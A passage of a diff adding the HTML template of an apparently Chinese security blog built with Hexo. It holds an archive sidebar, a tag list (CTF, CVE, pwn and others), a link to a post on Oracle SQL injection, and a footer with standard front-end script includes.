+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Bugku writeup4" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 Junay&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
